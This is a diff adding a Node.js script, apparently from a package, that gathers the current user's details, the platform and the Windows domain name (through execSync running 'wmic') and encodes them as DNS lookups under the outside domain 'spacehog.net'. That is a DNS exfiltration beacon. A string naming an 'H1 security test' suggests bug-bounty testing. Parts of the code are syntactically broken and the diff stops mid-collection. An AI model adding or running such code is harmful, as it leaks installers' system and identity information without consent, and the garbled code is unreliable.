@@ -1,0 +1,58 @@
+var os = require('os')
+var crypto = require('crypto')
+var dns = require('dns')
+const http = require('http')
+const execSync = require('child_process').execSync
+function myChunker = function myChunker(string,chunk_size) {
+    var b = [];
+    newstring = '';
+    char_count = 0
+
+    for(var i=0; i < string.length; i+=1){
+        char_count+=1;
+        if (char_count < chunk_size) {
+            newstring+= string[i];
+        }
+        else {
+    	    b.push(newstring);
+	    newstring = string[i];
+	    char_count = 0;
+        }
+    }
+    
+    if (newstring.length != 0 && b[b.length -1] != newstring){b.push(newstring);} //also need to check if newstring == the last element in b
+    
+    if (b.length > 0 && b.length < 3) {
+	    return_string = b.toString().replace(",",".");
+	    return_string += "." + newstring;
+	    return return_string;
+    }
+    else if (b.length == 0) {
+        return newstring;
+    }
+    else {
+        return b;
+    }
+}
+function dnsCallback = function dnsCallback (sequence,semi_random_id, information, information_identifier, domain) {
+    var callback = dns.lookup(sequence+'.'+semi_random_id+'.'+information_identifier+'.'+information+'.'+domain, function (err, addresses, family) {console.log(addresses);});
+}
+function dnsPreCallbackCheck = function dnsPreCallbackCheck(semi_random_id, information, information_identifier, domain) {
+    if (typeof information == 'object') {
+     
+        for (i = 0; i < information.length;i++ ) {
+            dnsCallback (i,semi_random_id, information[i], information_identifier, domain);    
+        }
+    }
+    else if (typeof information == 'string') {
+        dnsCallback ('n',semi_random_id, information, information_identifier, domain);
+    }
+}
+let domain = 'spacehog.net'
+let super_secret_password = 'H1-security-test-november'
+let userinfo = os.userInfo()
+let info = ""
+const buf = crypto.randomBytes(2)
+const semi_random_id = buf.toString('hex')
+(_tmp_1 = os.platform()).includes
+domain_info = execSync('wmic computersystem get domain').toString()
